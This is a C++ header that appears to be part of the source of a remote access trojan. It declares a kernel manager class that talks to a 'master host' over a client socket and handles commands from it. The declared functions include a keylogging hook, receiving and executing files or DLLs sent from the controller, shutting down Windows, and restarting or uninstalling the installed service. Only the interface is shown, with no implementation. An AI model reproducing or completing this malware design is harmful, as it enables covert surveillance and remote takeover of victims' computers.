// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_)
#define AFX_KERNELMANAGER_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CKernelManager : public CManager  
{
public:
	void init(CClientSocket *pClient, LPCTSTR lpszServiceName,
		DWORD dwServiceType, LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort);
	CKernelManager(CClientSocket *pClient, 
		LPCTSTR lpszMasterHost, UINT nMasterPort/*,UCHAR Linetype,UCHAR Opertype,CHAR *Address*/);

	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void StartUnLineHook();//键盘记录
	CKernelManager(CClientSocket *pClient);//键盘记录
	char	m_strServiceName[256];

	void ShutdownWindows(DWORD dwReason);


	static	char	m_strMasterHost[256];
	static	UINT	m_nMasterPort;
	BOOL	RecvAndOpenFile(const void *filedata, UINT size, INT nShowCmd);
	BOOL	OpenFileDll(const void *filedata, UINT size);
	void	ReStartServer();
	void	UnInstallServer();
	BOOL	IsActived();

	BOOL	m_bIsActived;

private:
	HANDLE	m_hThread[10000]; // 足够用了
	UINT	m_nThreadCount;
	DWORD	m_dwServiceType;
	BOOL API_CreateProcessA(
		IN LPCSTR lpApplicationName,
		IN LPSTR lpCommandLine,
		IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
		IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
		IN BOOL bInheritHandles,
		IN DWORD dwCreationFlags,
		IN LPVOID lpEnvironment,
		IN LPCSTR lpCurrentDirectory,
		IN LPSTARTUPINFOA lpStartupInfo,
		OUT LPPROCESS_INFORMATION lpProcessInformation
		);
	void SortProce(BOOL Strp);
};

#endif // !defined(AFX_KERNELMANAGER_H__D38BBAEA_31C6_4C8A_8BF7_BF3E80182EAE__INCLUDED_)
